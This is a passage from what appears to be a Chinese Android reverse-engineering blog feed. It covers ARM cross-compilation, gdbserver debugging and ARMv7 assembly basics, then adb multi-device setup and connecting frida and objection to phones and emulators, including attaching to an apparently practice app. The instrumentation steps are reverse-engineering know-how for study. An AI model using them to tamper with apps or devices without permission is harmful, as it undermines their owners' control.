aarch64-linux-android21 hello.c -o arm_hello<br><span class="hljs-comment"># 这里的前缀或目标参数的格式是目标三元组，带有表示 minSdkVersion 的后缀</span><br><span class="hljs-comment"># 三元组在下面的表格中展示，21是后缀，这两个都可以进行更改</span><br><br><span class="hljs-comment"># 这里是相关的命令</span><br>clang -target aarch64-linux-android21 -E hello.c -o arm_hello.i         <span class="hljs-comment"># 预处理</span><br>clang -target aarch64-linux-android21 -S arm_hello.i -o arm_hello.s     <span class="hljs-comment"># 编译</span><br>clang -target aarch64-linux-android21 -c arm_hello.s -o arm_hello.o     <span class="hljs-comment"># 汇编</span><br>clang -target aarch64-linux-android21 arm_hello.o -o arm_hello          <span class="hljs-comment"># 链接</span><br><span class="hljs-comment"># 这里如果不加 `-o` 选项，那么会自动生成同名的文件，后缀名不同</span><br><br></code></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">ABI</th><th style="text-align:left">三元组</th></tr></thead><tbody><tr><td style="text-align:left">armeabi-v7a</td><td style="text-align:left"><code>armv7a-linux-androideabi</code></td></tr><tr><td style="text-align:left">arm64-v8a</td><td style="text-align:left"><code>aarch64-linux-android</code></td></tr><tr><td style="text-align:left">x86</td><td style="text-align:left"><code>i686-linux-android</code></td></tr><tr><td style="text-align:left">x86-64</td><td style="text-align:left"><code>x86_64-linux-android</code></td></tr></tbody></table><h2 id="how-to-use-gdb"><a class="markdownIt-Anchor" href="#how-to-use-gdb"></a> How to use gdb</h2><ul><li>path of gdb <code>/home/tcz/environment/android-ndk-r21e/prebuilt/android-arm64/gdbserver/gdbserver</code> -&gt; <code>/data/local/tmp/gdbserver64</code></li><li>这里需要注意gdbserver的架构需要与调试的程序架构相同，所以在<code>~/.bashrc</code>中设置环境变量<code>alias gdb-arm='~/environment/android-ndk-r21e/prebuilt/linux-x86_64/bin/gdb'</code></li><li>同时根据<code>android-ndk-r21e</code>的gdb只有<code>python2.7</code>的特性，需要配置特定python2的<code>gef-legacy</code>，这里就需要在<code>~/.gdbinit</code>中加入<code>set auto-load safe-path ~/android/arm/arm_study</code>允许特定目录加载自己的<code>.gdbinit</code>文件，然后在那个文件中填写<code>source /home/tcz/pwn/tools/gef-legacy/gef.py</code>进行gdb调用，这样就可以在这个目录下实现gdb-arm调用gef了</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-keyword">in</span> adb</span><br>./gdbserver :9090 ./arm_hello <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-keyword">in</span> linux</span><br>adb forward tcp:9090 tcp:9090<br>gdb-arm    # 其实就是 ~/environment/android-ndk-r21e/prebuilt/linux-x86_64/bin/gdb<br><span class="hljs-meta prompt_">gef&gt; </span><span class="language-bash">target remote localhost:9090</span><br><br></code></pre></td></tr></table></figure><h1 id="arm-v7a"><a class="markdownIt-Anchor" href="#arm-v7a"></a> arm-v7a</h1><h2 id="汇编相关"><a class="markdownIt-Anchor" href="#汇编相关"></a> 汇编相关</h2><h3 id="编译后文件"><a class="markdownIt-Anchor" href="#编译后文件"></a> 编译后文件</h3><p>​在经过 <code>clang</code> 对源文件(cpp文件)进行预处理和编译之后会生成一个<code>.s</code>的汇编文件，其内容包含了相关的汇编指令，简单的结构如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">处理器信息<br>段<span class="hljs-meta">section</span><br><span class="hljs-meta">.text</span><br><span class="hljs-meta">.section</span>.rodata<span class="hljs-number">.</span>str1<span class="hljs-number">.1</span>,<span class="hljs-string">&quot;aMS&quot;</span>,%progbits,<span class="hljs-number">1</span><br><span class="hljs-meta">.section</span><span class="hljs-string">&quot;.note.GNU-stack&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,%progbits<br><br>符号<br>外部符号<br><span class="hljs-built_in">bl</span> printf<br><br>子程序<br><span class="hljs-meta">.globl</span>main                    @ -- Begin function main<br><span class="hljs-meta">.type</span>main,%function<br><span class="hljs-meta">.code</span><span class="hljs-number">32</span>                      @ @main<br><br>main<br><span class="hljs-meta">.fnstart</span>@ 伪指令，方便读代码<br><span class="hljs-meta">.fnend</span><br></code></pre></td></tr></table></figure><p>​这里根据hello.c的内容通过命令 <code>clang -target armv7a-linux-androideabi21 -S hello.c -o arm_hello321.s</code> 生成一个arm.s文件进行分析。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARM <span class="hljs-string">&quot;armv7a&quot;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello %s\n&quot;</span>, ARM);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br>.syntax unified<br>.eabi_attribute67, &quot;2.09&quot;@ Tag_conformance<br>.eabi_attribute6, 10@ Tag_CPU_arch<br>.eabi_attribute7, 65@ Tag_CPU_arch_profile<br>.eabi_attribute8, 1@ Tag_ARM_ISA_use<br>.eabi_attribute9, 2@ Tag_THUMB_ISA_use<br>.fpuneon<br>.eabi_attribute34, 1@ Tag_CPU_unaligned_access<br>.eabi_attribute15, 1@ Tag_ABI_PCS_RW_data<br>.eabi_attribute16, 1@ Tag_ABI_PCS_RO_data<br>.eabi_attribute17, 2@ Tag_ABI_PCS_GOT_use<br>.eabi_attribute20, 1@ Tag_ABI_FP_denormal<br>.eabi_attribute21, 1@ Tag_ABI_FP_exceptions<br>.eabi_attribute23, 3@ Tag_ABI_FP_number_model<br>.eabi_attribute24, 1@ Tag_ABI_align_needed<br>.eabi_attribute25, 1@ Tag_ABI_align_preserved<br>.eabi_attribute38, 1@ Tag_ABI_FP_16bit_format<br>.eabi_attribute18, 4@ Tag_ABI_PCS_wchar_t<br>.eabi_attribute26, 2@ Tag_ABI_enum_size<br>.eabi_attribute14, 0@ Tag_ABI_PCS_R9_use<br>.file&quot;hello.c&quot;<br>.globlmain                    @ -- Begin function main<br>.p2align2<br>.typemain,%function<br>.code32                      @ @main<br>main:<br>.fnstart<br>@ %bb.0:<br>.save&#123;r11, lr&#125;<br>push&#123;r11, lr&#125;<br>.setfpr11, sp<br>movr11, sp<br>.pad#8<br>subsp, sp, #8<br>ldrr0, .LCPI0_0<br>.LPC0_0:<br>addr0, pc, r0<br>ldrr1, .LCPI0_1<br>.LPC0_1:<br>addr1, pc, r1<br>movwr2, #0<br>strr2, [sp, #4]<br>blprintf<br>movwr1, #0<br>strr0, [sp]                @ 4-byte Spill<br>movr0, r1<br>movsp, r11<br>pop&#123;r11, pc&#125;<br>.p2align2<br>@ %bb.1:<br>.LCPI0_0:<br>.long.L.str-(.LPC0_0+8)<br>.LCPI0_1:<br>.long.L.str.1-(.LPC0_1+8)<br>.Lfunc_end0:<br>.sizemain, .Lfunc_end0-main<br>.cantunwind<br>.fnend<br>                                        @ -- End function<br>.type.L.str,%object          @ @.str<br>.section.rodata.str1.1,&quot;aMS&quot;,%progbits,1<br>.L.str:<br>.asciz&quot;hello %s\n&quot;<br>.size.L.str, 10<br><br>.type.L.str.1,%object        @ @.str.1<br>.L.str.1:<br>.asciz&quot;armv7a&quot;<br>.size.L.str.1, 7<br><br><br>.ident&quot;Android (7019983 based on r365631c3) clang version 9.0.9 (https://android.googlesource.com/toolchain/llvm-project a2a1e703c0edb03ba29944e529ccbf457742737b) (based on LLVM 9.0.9svn)&quot;<br>.section&quot;.note.GNU-stack&quot;,&quot;&quot;,%progbits<br></code></pre></td></tr></table></figure><p>​上面就是得到的 <code>.s</code> 文件的具体信息，但是其中包含编译器和操作系统的一些对于运行没有帮助的额外信息，可以通过删减这些信息来精简文件，从而获得上面提到的简单的结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br>.syntax unified        @ 表示编译的类型，可要可不要 <br>.globlmain                    @ -- Begin function main<br>.p2align2<br>.typemain,%function<br>.code32                      @ @main<br>main:<br>.fnstart<br>@ %bb.0:<br>.save&#123;r11, lr&#125;<br>push&#123;r11, lr&#125;<br>.setfpr11, sp<br>movr11, sp<br>.pad#8<br>subsp, sp, #8<br>ldrr0, .LCPI0_0<br>.LPC0_0:<br>addr0, pc, r0<br>ldrr1, .LCPI0_1<br>.LPC0_1:<br>addr1, pc, r1<br>movwr2, #0<br>strr2, [sp, #4]<br>blprintf<br>movwr1, #0<br>strr0, [sp]                @ 4-byte Spill<br>movr0, r1<br>movsp, r11<br>pop&#123;r11, pc&#125;<br>.p2align2<br>@ %bb.1:<br>.LCPI0_0:<br>.long.L.str-(.LPC0_0+8)<br>.LCPI0_1:<br>.long.L.str.1-(.LPC0_1+8)<br>.Lfunc_end0:<br>.sizemain, .Lfunc_end0-main<br>.cantunwind<br>.fnend<br>                                        @ -- End function<br>.type.L.str,%object          @ @.str<br>.section.rodata.str1.1,&quot;aMS&quot;,%progbits,1<br>.L.str:<br>.asciz&quot;hello %s\n&quot;<br>.size.L.str, 10<br><br>.type.L.str.1,%object        @ @.str.1<br>.L.str.1:<br>.asciz&quot;armv7a&quot;<br>.size.L.str.1, 7<br><br><br>.section&quot;.note.GNU-stack&quot;,&quot;&quot;,%progbits<br></code></pre></td></tr></table></figure><h2 id="寄存器"><a class="markdownIt-Anchor" href="#寄存器"></a> 寄存器</h2><p>​arm32的寄存器共17个，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">R0~R7 未分组寄存器<br>R8~R12 分组寄存器<br>R13~R14<br>R13 SP<br>R14 LR<br>R15 PC<br>CPSR条件判断的标志寄存器<br></code></pre></td></tr></table></figure><h2 id="程序调用"><a class="markdownIt-Anchor" href="#程序调用"></a> 程序调用</h2><p>​下面是程序调用的语句，参数少于4个使用r0~r3传参，参数大于4个时，多的参数使用栈传递，同时使用r0传递返回值，lr传递返回地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">bl printf<br></code></pre></td></tr></table></figure><h2 id="汇编指令"><a class="markdownIt-Anchor" href="#汇编指令"></a> 汇编指令</h2><ul><li><p>寻址方式</p><ul><li>立即数寻址 -&gt; <code>mov r0, #2</code></li><li>寄存器寻址 -&gt; <code>mov r0, r1</code></li><li>寄存器移位寻址<ul><li>LSL 逻辑左移 -&gt; <code>mov r0, r1, LSL #4</code> r0 = r1 &lt;&lt; 44</li><li>LSR 逻辑右移</li><li>ROR 循环右移</li><li>ASR 算术右移</li><li>RRX 扩展的循环右移</li></ul></li><li>Load Store 的寻址方式<ul><li>ldr(保存到寄存器) 与 str(保存到内存)</li><li>立即数</li><li>寄存器 -&gt; <code>str r0,[r3]</code> *(r3) = r0</li><li>基址变址 -&gt; <code>ldr r0,[r3, #4]</code> r0 = *(r3+4)</li></ul></li><li>栈寻址<ul><li>stmfd<ul><li><code>push &#123;r5, r6, r7, lr&#125;</code></li><li><code>stmfd sp!, &#123;r5-57, lr&#125;</code> 和上面等价</li></ul></li><li>ldmfd</li></ul></li></ul></li><li><p>汇编指令</p><ul><li>跳转指令<ul><li><code>B</code>  强制跳转指令</li><li><code>BL</code> 带返回的跳转指令，lr寄存器存储返回地址</li><li><code>BLX</code> 带返回和带状态切换的跳转指令，arm -&gt; thumb，thumb-&gt;arm</li><li><code>BX</code> 带状态切换的跳转指令</li></ul></li><li>数据处理指令<ul><li>mov, add, sub, and, eor, orr, bic</li><li><code>mov r0，r1</code></li><li><code>add rO，r1, r2</code> -&gt; r0 = r1 + r2</li><li><code>sub r0，r1, r2</code></li><li><code>and rO，r1, r2</code> -&gt; r0 = r1 &amp; r2</li><li><code>eor r0，r1，r2</code> -&gt; r0 = r1 ^ r2</li><li><code>orr rO，r1, r2</code> -&gt; r0 = rr2</li><li><code>bic r0，r1，#0xf</code> -&gt; 0x12345678 -&gt; 0x12345670</li></ul></li><li>乘法指令<ul><li><code>MUL rO，r1, r2</code> -&gt; r0 = r1 x r2</li><li><code>MLA rO，r1, r2, r3</code>  -&gt; r0 = r1 x r2 + r3</li><li><code>SMULL r0，r1，r2，r3</code>  -&gt; r0 = (r2 x r3)的低32位，r1 = (r2 xr3)的高32位</li><li><code>SMLAL r0，r1，r2，r3</code>  -&gt; r0 = (r2 x r3)的低32位 + r0，r1 = (r2 x r3)的高32位 + r0</li><li><code>UMULL r0，r1，r2，r3</code>  -&gt; r0 = (r2 x r3)的低32位，r1 = (r2 xr3)的高32位 -&gt; 无符号</li><li><code>UMLAL r0，r1，r2，r3</code>  -&gt; r0 = (r2 x r3)的低32位 + r0，r1 = (r2 x r3)的高32位 + r0 -&gt; 无符号</li></ul></li></ul></li><li><p>内存访问指令</p><ul><li>ldr  4字节读取</li><li>ldrb 1字节读取</li><li>ldrh 2字节读取</li><li>str  4字节写入</li><li>strb 1字节写入</li><li>strh 2字节写入</li></ul></li></ul><p>Arm的官方文档 -&gt; <a href="https://developer.arm.com/documentation/ddi0406/cd?lang=en">ARM Architecture Reference Manual ARMv7-A and ARMv7-R edition</a></p><h1 id="arm-v8"><a class="markdownIt-Anchor" href="#arm-v8"></a> arm-v8</h1><p>​参考资料 -&gt; <a href="https://www.lyldalek.top/article/arm">ARM汇编 | Notion Blog (lyldalek.top)</a></p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Adb多设备连接</title>
    <link href="/posts/586563fd.html"/>
    <url>/posts/586563fd.html</url>
    
    <content type="html"><![CDATA[<h1 id="adb原理"><a class="markdownIt-Anchor" href="#adb原理"></a> Adb原理</h1><p>​Adb(Android Debug Bridge)被称为 Android调试桥，它是AOSP的一部分，用于在开发环境中与设备进行通信，执行各种设备操作。它是 PC 端和移动终端通信的桥梁，是一种C/S架构的服务，通常包含以下三个组件：</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403041955759.png" alt="image-20240304195530684" /></p><h2 id="客户端"><a class="markdownIt-Anchor" href="#客户端"></a> 客户端</h2><p>​Client是一个运行在 PC 端的组件，它主要用于发送命令，可以通过在命令行中使用adb进行调用。它主要解析push、install等命令，进行预处理，转化为指令或数据发送给服务端</p><h2 id="服务端"><a class="markdownIt-Anchor" href="#服务端"></a> 服务端</h2><p>​Server是一个与运行在 PC 端后台的组件(后台进程)，它的作用主要是两个：</p><ul><li>检测USB端口感知设备的连接和拔除，以及模拟器实例的启动或停止，简要而言，就是测试是否有设备连接。它维护了一张设备状态表，为每一个设备标记了一个状态：offline，bootloader，recovery或者online。</li><li>将 Client 的请求通过 usb或者tcp 的方式发送到对应的 adbd 上</li></ul><h2 id="守护进程"><a class="markdownIt-Anchor" href="#守护进程"></a> 守护进程</h2><p>​Daemon是一个存在于Android设备的一个后台进程，它是由init进程启动的，并且系统一开机就已经启动，它的主要作用是处理来自 Server 的命令请求，然后运行相关命令，再将结果返回给 Server</p><h2 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h2><p>​当启动一个 Adb 客户端时(在PC终端中输入命令执行就是创建客户端)，该客户端会检测 PC 后台是否有服务端正在运行，如果没有，它会先启动服务器进程(客户端和服务端都在用一个程序adb.exe中)，服务器在启动后会与本地 TCP 端口 5037 进行绑定，同时监听 adb 客户发出的命令(这里5037监听本机所有发送给自己的信息，所以客户端发送信息都是发送道5037这个端口上)。</p><p>​之后服务端会与所有正在运行的设备建立连接，它通过扫描PC的 5555 到 5585 之间(该范围供前 16 个模拟器使用)的奇数号端口查找模拟器，服务器一旦发现 adb 守护程序(adbd)，便会与相应的端口建立连接，请注意，每个模拟器都使用一对按顺序排列的端口(用于控制台连接的偶数号端口和用于 adb 连接的奇数号端口)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">Emulator 1, console: 5554<br>Emulator 1, adb: 5555<br>Emulator 2, console: 5556<br>Emulator 2, adb: 5557 ...<br></code></pre></td></tr></table></figure><p>​在端口 5555 处与 adb 连接的模拟器与控制台监听端口为 5554 的模拟器是同一个。这里Server与adbd可以通过TCP/IP方法进行通信，同时也可以使用 USB 连接的方法进行通信。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403042042159.png" alt="img" /></p><h1 id="安卓模拟器"><a class="markdownIt-Anchor" href="#安卓模拟器"></a> 安卓模拟器</h1><p>​这里普遍认为是开启模拟器的usb调试，然后使用 <code>adb connect 127.0.0.1:port</code> 进行连接，之后使用 <code>adb devices</code> 可以看到以 <code>&lt;ip:port&gt;</code> 为名称的设备出现。但是结合真机调试与模拟器测试，我认为安卓模拟器通常采用的是 TCP/IP 进行adb连接，而真机使用的是usb连接。</p><p>​对于真机，使用usb连接会在刚插入usb线并开启usb调试后被 adb-server 识别出来，使用 <code>adb devices</code> 可以看到以<strong>序列号</strong>为名称的设备</p><p>​对于模拟器，不开启usb调试，而是直接使用connect连接特定的端口就可以发现设备。这里需要注意在 NAT 模式下，必须保证模拟器有WIFI连接，这里认为模拟器是使用了 WIFI 连接到主机网卡的过程中绑定了本地的端口，然后因为server找不到模拟器(很多模拟器不使用端口5555 到 5585)，所以需要手动connect进行绑定。</p><h1 id="多设备下的adb"><a class="markdownIt-Anchor" href="#多设备下的adb"></a> 多设备下的adb</h1><p>​在多个设备环境中(比如多个模拟器)，直接使用 <code>adb shell</code> 等工具会因为不知道启用哪个设备而报错，这个时候就需要来指定设备。下面就是使用 <code>-s &lt;名称&gt;</code> 参数来指定设备进行调试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb -s 127.0.0.1:21503 shell<br></code></pre></td></tr></table></figure><p>​这里有点绷不住了，使用adb和frida-ps进行检测，会发现识别出的信息不同，这里使用usb连接真机，同时使用一个逍遥模拟器，它利用nat连接WIFI。先查看adb和frida-ps的相关参数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb --help<br>global options:<br>-a         listen on all network interfaces, not just localhost<br>-d         use USB device (error if multiple devices connected)<br>-e         use TCP/IP device (error if multiple TCP/IP devices available)<br>-s SERIAL  use device with given serial (overrides $ANDROID_SERIAL)<br><br><br>frida-ps --help<br>Options:<br>-U, --usb             connect to USB device<br>-D ID, --device=ID    connect to device with the given ID<br><br><br>objection --help<br>Options:<br>-N, --network            Connect using a network connection instead of USB.<br>-h, --host TEXT          [default: 127.0.0.1]<br>-p, --port INTEGER       [default: 27042]<br>-ah, --api-host TEXT     [default: 127.0.0.1]<br>-ap, --api-port INTEGER  [default: 8888]<br>-g, --gadget TEXT        Name of the Frida Gadget/Process to connect to.<br>[default: Gadget]<br>-S, --serial TEXT        A device serial to connect to.<br></code></pre></td></tr></table></figure><ul><li>使用adb的-d选项可以匹配usb连接的真机，-e选项可以连接模拟器</li><li>而使用frida-ps的-U选项连接的却是模拟器</li></ul><p>​猜测二者的检测机制不相同，<code>adb</code> 的连接可以检测出当前模拟器采用的就是TCP/IP连接，而 <code>frida-ps</code> 的检测就显得有点奇怪，所以对于 <code>frida-ps</code> 和 <code>frida</code>，则使用 <code>-D ID</code> 参数，通过命令 <code>adb devices</code> 中显示的 ID(名称) 来匹配不同的设备。对于 <code>objection</code> ，则使用 <code>-S serial</code> 参数来识别设备，这里的serial就是上面的ID。</p><h1 id="无线wifi连接"><a class="markdownIt-Anchor" href="#无线wifi连接"></a> 无线(WIFI)连接</h1><p>​这里尝试使用无线网络进行测试objection的 <code>-p</code> 选项，因为目前的测试结果就是，我模拟器的frida-server监听7878端口，objection不能连接，同时设置 <code>adb forword tcp:27042 tcp:7878</code> 也无法连接。所以尝试无线连接真机看看 <code>-p</code> 选项是否成功。</p><p>​首先配置手机的无线连接，最为重要的就是手机需要存在 adbd进程。而使之存在有两种方法，一种是使用adb启动usb连接手机的无线调试功能(有点鸡肋，都能usb连接了，还要无线连接搞什么)，另一种就是使用Android中命令行指令启动无线调试，两种方案，一是adb来利用shell，二是可以下个termux使用命令行处理。详细查看 -&gt; <a href="https://blog.csdn.net/lerous/article/details/108297330">adb wifi调试问题</a></p><p>​这样之后，<code>adb devices</code> 中就存在一个无线连接的设备了，可以直接adb进行来连接，这里注意PC和手机需要在同一个局域网内，尝试ping一下看看，可以ping通就表示无线连接可行。然后在手机中 <code>frida-server</code> 启动7878端口，然后PC中使用objection直接连接 <code>objection -N -h 192.168.123.213 -p 7878 -g com.zj.wuaipojie explore</code>，然后就成功了。</p><p>​然后断开无线连接，使用真机的usb连接来开启 <code>frida-server</code> 的7878端口，然后再使用 objection。然后可以发现，不论怎么使用端口转发，<code>-p 7878</code> 加不加，都无法使得 objection 连接到目标真机上面。</p><p>​这样一来，感觉可以验证模拟器对于frida一类就是个usb连接设备(adb理解它为TCP/IP连接的，adb是通过本地回环地址的端口进行设备连接的)，它的WIFI功能就是个摆设。而 <code>objection</code> 对于usb连接设备不提供 <code>frida-server</code> 的切换端口功能，它只对无线连接的设备提供。所以usb设备想要使用 <code>objection</code>，还是老老实实的用 <code>frida-server</code> 的默认端口 27042吧。</p><p>​PS：叠层甲，这个只是我拿真机与模拟器测试的结果，可能存在别的方案使得上述结论无效，如果存在，麻烦关于那里通知我一下，不胜感激。</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><blockquote><p>这里是对 adb，frida，frida-ps，objection对于同时连接真机和模拟器设备的使用总结</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">List of devices attached<br>8C5X1J8JR       device<br>127.0.0.1:21503 device<br>192.168.123.213:5555    device# WIFI连接是后来加的，和8C5X1J8JR是同一台真机设备<br></code></pre></td></tr></table></figure><h2 id="adb"><a class="markdownIt-Anchor" href="#adb"></a> adb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">模拟器设备</span><br>adb -e shell<br><span class="hljs-meta prompt_"># </span><span class="language-bash">usb连接设备</span><br>adb -d shell# 这两个命令面对同类设备只存在一个的情况时可以使用<br><span class="hljs-meta prompt_"># </span><span class="language-bash">WIFI连接设备</span><br>adb -a shell# 这个只有单个设备时才能使用，条件比上面两个更苛刻<br><span class="hljs-meta prompt_"># </span><span class="language-bash">通用连接</span><br>adb -s 192.168.123.213:5555 shell# -s SERIAL根据序列号来连接，是通用连接方式，多设备都可以连接<br></code></pre></td></tr></table></figure><p>​adb 将模拟器识别为 TCP/IP 连接设备，它通过本地回环地址的端口(模拟器adbd使用的端口)进行连接。这里提及的模拟器都是使用 NAT 网络连接，其中的WIFI是一个摆设，但是如果改为桥接模式，那么可以将模拟器视为一个 WIFI 连接的设备。</p><h2 id="frida等"><a class="markdownIt-Anchor" href="#frida等"></a> frida等</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">通用连接</span><br>frida-ps -D ID# 直接根据上面的 SERIAL充当ID 进行连接<br><span class="hljs-meta prompt_"># </span><span class="language-bash">模拟器连接</span><br>frida-ps -U# 还存在一个usb设备的情况下，这个命令只匹配模拟器，若是只有一个模拟器没有真机，也匹配模拟器<br><span class="hljs-meta prompt_"># </span><span class="language-bash">端口修改连接</span><br>./frida-server-16.0.8-android-arm64 -l 0.0.0.0:19233<br>adb forward tcp:19233 tcp:19233<br>frida -H 127.0.0.1:19233 -f 包名 -l .\js_example.js<br></code></pre></td></tr></table></figure><p>​frida等 将模拟器视为优先级更高的 usb连接设备，所以对于模拟器的连接直接使用 <code>-U</code> 就可以连接</p><h2 id="objection"><a class="markdownIt-Anchor" href="#objection"></a> objection</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">usb设备-&gt;usb连接的手机和模拟器，这个情况下，frida-server不能更改监听的端口</span><br>objection -S SERIAL -g &lt;package-name&gt; explore<br><span class="hljs-meta prompt_"># </span><span class="language-bash">WIFI设备，这个情况下可以随意更改frida-server监听端口</span><br>objection -N -h 192.168.123.213 -p 7878 -g &lt;package-name&gt; explore<br></code></pre></td></tr></table></figure><p>​objection 的 <code>-p</code> 设置只能适用于无线连接设备，usb连接设备(真机和模拟器)都不可以进行设置。这里 <code>frida-server</code> 